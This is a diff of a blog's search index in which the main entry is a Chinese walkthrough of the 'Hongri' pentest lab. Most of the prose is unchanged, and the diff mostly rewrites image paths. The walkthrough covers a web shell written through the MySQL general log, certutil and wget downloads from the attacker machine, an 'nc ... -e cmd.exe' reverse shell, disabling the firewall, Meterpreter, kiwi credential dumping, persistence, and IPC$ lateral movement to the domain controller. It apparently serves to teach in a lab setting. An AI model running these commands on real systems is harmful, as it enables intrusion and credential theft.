@@ -298,165 +298,230 @@
   </entry>
   <entry>
     <title>红日靶场</title>
-    <url>/2023/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/</url>
-    <content><![CDATA[<p><strong>红日靶场</strong></p>
-<p>编辑虚拟网络</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps113.jpg" alt="img"> </p>
+    <url>/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/</url>
+    <content><![CDATA[<h3 id="红日靶场"><a href="#红日靶场" class="headerlink" title="红日靶场"></a>红日靶场</h3><p><strong>编辑虚拟网络</strong></p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8790.png" class title="This is an test image"> 
+
 <p>kali</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps114.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8791.png" class title="This is an test image">  
+
 <p>Win 7</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps115.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8792.png" class title="This is an test image">  
+
 <p>Win2K3&#x2F;2008 R2</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps116.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8793.png" class title="This is an test image">  
+
 <p>查看本机ip</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps117.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8794.png" class title="This is an test image">  
+
 <p>开靶机和未开靶机对比，得知目标主机IP为192.168.229.129</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps118.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8795.png" class title="This is an test image">  
+
 <p>启动Win7中的Web服务</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps119.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8796.png" class title="This is an test image">  
+
 <p>nmap扫描一下目标主机，发现开放了80, 3306端口</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps120.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8797.png" class title="This is an test image">  
+
 <p>对目标进行访问，发现默认页面为phpStudy 探针,泄露大量信息。</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps121.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8798.png" class title="This is an test image">  
+
 <p>目录扫描，发现后台登录界面的网址</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps122.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8799.png" class title="This is an test image">  
+
 <p>尝试访问</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps123.jpg" alt="img"> </p>
-<p>抓包发现没有进行防爆破，尝试进行爆破</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps124.jpg" alt="img"> </p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps125.jpg" alt="img"> </p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps126.jpg" alt="img"> </p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps127.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87100.png" class title="This is an test image">  
+
+<p> 抓包发现没有进行防爆破，尝试进行爆破</p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87101.png" class title="This is an test image">  
+
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87102.png" class title="This is an test image">  
+
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87103.png" class title="This is an test image">  
+
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87104.png" class title="This is an test image">   
+
 <p>账密为root&#x2F;root,进入后台</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps128.jpg" alt="img"> </p>
-<p>将变量中的general log更改为ON，将general log file的路径更改为当前网站根目录下路径C:\phpStudy\WWW\test.php。（开启 SQL 的通用查询日志功能，并将日志文件保存在该路径）<img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps129.jpg" alt="img"></p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87105.png" class title="This is an test image">   
+
+<p>将变量中的general log更改为ON，将general log file的路径更改为当前网站根目录下路径C:\phpStudy\WWW\test.php。（开启 SQL 的通用查询日志功能，并将日志文件保存在该路径）<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87106.png" class title="This is an test image">  </p>
 <p>在SQL界面写入一句话木马</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps130.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87107.png" class title="This is an test image">   
+
 <p>访问<a href="http://192.168.229.129/test.php?test=phpinfo();%E9%AA%8C%E8%AF%81%E6%88%90%E5%8A%9F%E6%8F%92%E5%85%A5">http://192.168.229.129/test.php?test=phpinfo();验证成功插入</a></p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps131.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87108.png" class title="This is an test image">  
+
 <p>将nc和wget.exe放入&#x2F;var&#x2F;www&#x2F;html目录下，然后启动Apache服务。</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps132.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87109.png" class title="This is an test image">  
+
 <p>查看服务的状态</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps133.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87110.png" class title="This is an test image">  
+
 <p>服务已正常启动，访问127.0.0.1看到默认页面</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps134.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87111.png" class title="This is an test image">    
+
 <p>WEBSHELL中执行，完整命令为<a href="http://192.168.229.129/test.php?test=system">http://192.168.229.129/test.php?test=system</a>(“certutil -urlcache -split -f <a href="http://192.168.229.128/wget.exe">http://192.168.229.128/wget.exe</a> C:\phpStudy\WWW\wget.exe”);</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps135.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87112.png" class title="This is an test image">   
+
 <p>通过Windows下的dir命令查看,<a href="http://192.168.229.129/test.php?test=system(%22dir%22)">http://192.168.229.129/test.php?test=system(&quot;dir&quot;)</a>;</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps136.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87113.png" class title="This is an test image">   
+
 <p>之后使用wget将整个nc的文件夹下载下来。WEBSHELL中执行wget -r -np -nH –cut-dirs&#x3D;1 <a href="http://192.168.100.128/nc/">http://192.168.100.128/nc/</a></p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps137.jpg" alt="img"> </p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps138.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87114.png" class title="This is an test image">   
+
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87115.png" class title="This is an test image">   
+
 <p>之后在kali上进行监听，再让Win7连接kali。靶机的WEBSHELL中执行nc 192.168.229.128 8888 -e cmd.exe</p>
 <p><a href="http://192.168.229.129/test.php?test=system">http://192.168.229.129/test.php?test=system</a>(“nc 192.168.229.128 8888 -e cmd.exe”);</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps139.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87116.png" class title="This is an test image">   
+
 <p>攻击机执行nc -vlp 8888</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps140.jpg" alt="img"> </p>
-<p>权限维持与内网信息收集</p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87117.png" class title="This is an test image">   
+
+
+
+<p><strong>权限维持与内网信息收集</strong></p>
 <p>首先修改cmd的字符编码为utf-8（chcp 65001），以此来避免乱码问题</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps141.jpg" alt="img"> </p>
-<p>获取系统信息</p>
-<p>有用信息：1.主机加了一个域god.org</p>
-<p>2.此主机的网络配置，内网网段包含192.168.52.143</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps142.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87118.png" class title="This is an test image">   
+
+<p><strong>获取系统信息</strong></p>
+<p>有用信息：1. 主机加了一个域god.org</p>
+<p>​                   2. 此主机的网络配置，内网网段包含192.168.52.143</p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87119.png" class title="This is an test image">   
+
 <p>Whoami得知我们现在的用户为administrator，属于god域</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps143.jpg" alt="img"> </p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps144.jpg" alt="img"> </p>
-<p>关闭windows防火墙</p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87120.png" class title="This is an test image">   
+
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87121.png" class title="This is an test image">   
+
+<p><strong>关闭windows防火墙</strong></p>
 <p>（”netsh” 是一个用于配置和监控各种网络设置的命令行工具。”advfirewall” 是 Windows Firewall（也称为Windows防火墙）的管理组件。”set currentprofile” 表示该命令将应用于当前活动的配置文件，即当前正在使用的防火墙配置文件。”state off” 意味着将关闭当前活动的防火墙配置文件。）</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps145.jpg" alt="img"> </p>
-<p>修改注册表以允许远程桌面连接</p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87122.png" class title="This is an test image">   
+
+
+
+<p><strong>修改注册表以允许远程桌面连接</strong></p>
 <p>HKEY_LOCAL_MACHINE” 分支下的 “SYSTEM\CurrentControlSet\Control\Terminal Server:修改的位置</p>
-<p>&#x2F;v fDenyTSConnections：修改的键值名称 fDenyTSConnections 是表示是否允许远程桌面连接的</p>
-<p>&#x2F;t REG_DWORD：设定数据类型</p>
-<p>&#x2F;d 0：设置数据</p>
-<p>&#x2F;f：强制操作</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps146.jpg" alt="img"> </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/v fDenyTSConnections：修改的键值名称 fDenyTSConnections 是表示是否允许远程桌面连接的</span><br><span class="line">/t REG_DWORD：设定数据类型</span><br><span class="line">/d 0：设置数据</span><br><span class="line">/f：强制操作</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87123.png" class title="This is an test image">   
+
 <p>启动远程桌面服务</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps147.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87124.png" class title="This is an test image">   
+
 <p>进行远程桌面连接</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps148.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87125.png" class title="This is an test image">   
+
 <p>创建一个msf的木马，将这个木马移动到&#x2F;var&#x2F;www&#x2F;html文件夹下</p>
-<p>-p    指定payload</p>
-<p>LHOST  攻击机IP</p>
-<p>LPORT  监听端口</p>
-<p>-f    确定输出格式</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps149.jpg" alt="img"> </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p    指定payload</span><br><span class="line">LHOST  攻击机IP</span><br><span class="line">LPORT  监听端口</span><br><span class="line">-f    确定输出格式</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87126.png" class title="This is an test image">   
+
 <p>让目标下载这个木马</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps150.jpg" alt="img"> </p>
-<p>进入msf框架的命令行</p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87127.png" class title="This is an test image">  
+
+<p> 进入msf框架的命令行</p>
 <p>use exploit&#x2F;multi&#x2F;handler使用“多模块”漏洞利用程序</p>
 <p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp设置要使用的负载类型，指定了Windows 64位操作系统上的Meterpreter负载</p>
 <p>set lhost设置攻击机器的IP地址</p>
 <p>set lport设置监听端口号</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps151.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87128.png" class title="This is an test image">  
+
 <p>运行木马</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps152.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87129.png" class title="This is an test image">  
+
 <p>成功返回结果</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps153.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87130.png" class title="This is an test image">  
+
 <p>getsystem进一步提权，getuid查看提权结果</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps154.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87131.png" class title="This is an test image">  
+
 <p>导入kiwi模块，获取到系统中的用户名和密码</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps155.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87132.png" class title="This is an test image">  
+
 <p>creds_all获取目标系统上存储的凭据信息</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps156.jpg" alt="img"> </p>
-<p>设置一个定时任务，以免连接被断开。（taskschd.msc打开任务计划程序）</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps157.jpg" alt="img"> </p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps158.jpg" alt="img"> </p>
-<p>创建完成，重启win7进行验证</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps159.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87133.png" class title="This is an test image">  
+
+<p> 设置一个定时任务，以免连接被断开。（taskschd.msc打开任务计划程序）</p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87134.png" class title="This is an test image">  
+
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87135.png" class title="This is an test image">  
+
+<p> 创建完成，重启win7进行验证</p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87136.png" class title="This is an test image">  
+
 <p>在攻击机上监听</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps160.jpg" alt="img"> </p>
-<p>下面是内网信息收集</p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87137.png" class title="This is an test image">  
+
+<p><strong>下面是内网信息收集</strong></p>
 <p>查看当前计算机&#x2F;域基本信息（net config workstation）</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps161.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87138.png" class title="This is an test image">  
+
 <p>已经知道了当前主机在GOD域中</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps162.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87139.png" class title="This is an test image">  
+
 <p>可知域控主机名为OWA</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps163.jpg" alt="img"> </p>
-<p>查询域用户</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps164.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87140.png" class title="This is an test image">  
+
+<p> 查询域用户</p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87141.png" class title="This is an test image">  
+
 <p>查看域的密码策略</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps165.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87142.png" class title="This is an test image">  
+
 <p>获取域管理员列表</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps166.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87143.png" class title="This is an test image">  
+
 <p>扫描当前内网网段，扫描出了138&#x2F;141两个IP（143前面已经知道是跳板机IP）</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps167.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87144.png" class title="This is an test image">  
+
 <p>ping一下OWA查看域控的IP</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps168.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87145.png" class title="This is an test image">  
+
 <p>至此内网的基本信息收集结束</p>
-<p>横向移动</p>
+<p><strong>横向移动</strong></p>
 <p>对域控进行扫描</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps169.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87146.png" class title="This is an test image">  
+
 <p>通过上面的信息收集，我们发现我们当前的账号在域中有登记，并不只是本地账户，因此我们可以尝试与域控直接进行IPC连接。</p>
 <p>发现同时开启了139&#x2F;445端口，有可能可以进行IPC连接。</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps170.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87147.png" class title="This is an test image">   
+
 <p>net use \目标IP\ipc$ “密码” &#x2F;user:”账户”，它的作用是使用 IPC（Inter-Process Communication，进程间通信）连接到目标 IP 地址上的 ipc$ 共享资源。</p>
 <p>net use 命令可以将本地系统的某个共享资源映射到远程系统上，并进行访问。</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps171.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87148.png" class title="This is an test image">  
+
 <p>尝试操控目标主机</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps172.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87149.png" class title="This is an test image">  
+
 <p>尝试让目标主机运行nc</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps173.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87150.png" class title="This is an test image">  
+
 <p>查看目标当前的时间</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps174.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87151.png" class title="This is an test image">  
+
 <p>使用at命令为目标创建一个计划任务，让其在指定的时间运行命令</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps175.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87152.png" class title="This is an test image">  
+
 <p>Win7上开启监听，到时间后成功回弹</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps176.jpg" alt="img"> </p>
-<p>之后尝试将shell反弹回攻击机上</p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87153.png" class title="This is an test image">  
+
+<p> 之后尝试将shell反弹回攻击机上</p>
 <p>在Win7上创建一个端口转发</p>
-<p>listenaddress：监听地址</p>
-<p>listenport：监听端口</p>
-<p>connectaddress：连接地址</p>
-<p>connectport：连接端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">listenaddress：监听地址</span><br><span class="line">listenport：监听端口</span><br><span class="line">connectaddress：连接地址</span><br><span class="line">connectport：连接端口</span><br></pre></td></tr></table></figure>
+
 <p>netsh interface portproxy show v4tov4：显示当前系统中的转发规则</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps177.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87154.png" class title="This is an test image">  
+
 <p>之后让域控连接Win7的9999端口</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps178.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87155.png" class title="This is an test image">  
+
 <p>在攻击机上开启端口9999的监听，在攻击机上成功获取域控的shell</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps179.jpg" alt="img"> </p>
+<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87156.png" class title="This is an test image">  
 ]]></content>
+      <tags>
+        <tag>Web-渗透测试</tag>
+      </tags>
   </entry>
   <entry>
     <title>老旧靶场——shop靶场&amp;封神台</title>
@@ -464,32 +529,32 @@
     <content><![CDATA[<h3 id="shop靶场-1"><a href="#shop靶场-1" class="headerlink" title="shop靶场-1"></a><strong>shop靶场-1</strong></h3><p><em>ps：借鉴了一部分其他小伙伴的渗透过程内容(csdn@哈哈哈cry)</em></p>
 <p>进入windows 7 x64虚拟机里钓鱼台网站的后台</p>
 <p>打开虚拟机后然后双击打开shop1:</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps2.jpg)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8737.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps2.jpg)
 
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps4.jpg)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8738.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps4.jpg)
 
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps6.jpg)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8739.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps6.jpg)
 
 <p>如果遇到双击打不开的情况，点击右下角的小三角形，找到绿色的KR，点击：</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps8.png)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8740.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps8.png)
 
 <p>点击关闭:</p>
-![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps10.png)
+<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8741.png" class title="This is an test image">![img](file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps10.png)
 
 <p>现在再点击就能打开了，如图：</p>
